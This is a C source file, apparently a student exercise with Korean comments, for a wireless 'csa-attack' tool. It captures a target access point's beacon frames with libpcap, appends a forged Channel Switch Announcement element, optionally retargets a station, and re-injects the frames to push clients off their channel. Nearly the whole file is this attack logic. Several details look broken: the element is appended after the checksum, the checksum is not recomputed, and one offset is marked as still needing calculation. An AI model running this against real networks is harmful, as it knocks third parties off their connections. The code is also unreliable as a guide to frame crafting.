#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>

#include "frame.h"

void usage();
void AP_broadcast_frame(struct Packet *packet);
void AP_unicast_frame(struct Packet *packet, char *station_mac);
void initPacket(struct Packet *packet, char *ap_mac);
void macStringToUint8(char *mac_string, uint8_t *ap_mac);
void handleSignal(int signal);
void cleanup(pcap_t *handle);
void packet_view(
    const struct pcap_pkthdr *h,
    const unsigned char *p
);
void process_packet(const struct pcap_pkthdr *header, const unsigned char *packet, char *station_mac);

pcap_t *global_handle;

int main(int argc, char *argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }
    
    char *interfaceName = argv[1];
    char *ap_mac = argv[2];
    char *station_mac = argv[3];
    bool flag = false;
    if(station_mac != NULL){
        printf("Unicast Mode\n");
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interfaceName, errbuf);
        return -1;
    }

     // Beacon Frame 필터를 설정
    struct bpf_program fp;
    char filter_exp[100];
    snprintf(filter_exp, sizeof(filter_exp), "type mgt subtype beacon and ether host %s", argv[2]);
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return -1;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return -1;
    }
    global_handle = handle;
    signal(SIGINT, handleSignal);
    

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 10) {
        struct pcap_pkthdr *header;
        const unsigned char *cap_packet;

        int result = pcap_next_ex(handle, &header, &cap_packet);

        
        
        if (result == 1) {  // 정상적으로 패킷을 가져온 경우
            packet_view(header, cap_packet);
            process_packet(header, cap_packet,station_mac);
            // packet_view(header, cap_packet); //제대로 잡긴하네
        } else if (result == -1) {  // 에러가 발생한 경우
            fprintf(stderr, "Error occurred while capturing packets: %s\n", pcap_geterr(handle));
        } else if (result == 0) {  // 타임아웃이 발생한 경우
            printf("Time Out\n");
            pcap_close(handle);
            exit(0);
        }
        sleep(1);
    }

    cleanup(handle);
    return 0;
}

void usage() {
    printf("Syntax is incorrect.\n");
    printf("syntax : csa-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void macStringToUint8(char *mac_string, uint8_t *ap_mac) {
    sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);
}

void handleSignal(int signal) {
    printf("Entered Ctrl+C, exit program\n");
    cleanup(global_handle);
    exit(0);
}

void cleanup(pcap_t *handle) {
    printf("pcap close!\n");
    pcap_close(handle);
}

void packet_view(const struct pcap_pkthdr *h, const unsigned char *p) {
    int len = 0;
    printf("PACKET (Total Length: %d bytes)\n", h->len);
    return;
}



void process_packet(const struct pcap_pkthdr *header, const unsigned char *packet, char *station_mac) {
    int fcs_offset = header->len - 4; // FCS는 마지막 4바이트
    uint32_t fcs_value = *((uint32_t *)(packet + fcs_offset));

    // CSA 정보 추가
    uint8_t csa_data[5] = {0x25, 0x03, 0x01, 0x13, 0x03};

    // 패킷에 CSA 정보 추가
    int new_packet_len = header->len + sizeof(csa_data);
    unsigned char *new_packet = (unsigned char *)malloc(new_packet_len);
    if (new_packet != NULL) {
        memcpy(new_packet, packet, header->len);
        memcpy(new_packet + header->len, csa_data, sizeof(csa_data));

        // Unicast 대상인 경우, destination_address 수정
        if (station_mac != NULL) {
            macStringToUint8(station_mac, new_packet + 4); // 수정할 위치 계산 필요
        }

        // 패킷 보내기 전에 패킷 정보 출력
        packet_view(header, new_packet);

        if (pcap_sendpacket(global_handle, new_packet, new_packet_len) != 0) {
            fprintf(stderr, "Frame send failed\n");
            cleanup(global_handle);
            exit(-1);
        }

        free(new_packet);
    } else {
        fprintf(stderr, "Memory allocation failed\n");
    }
}


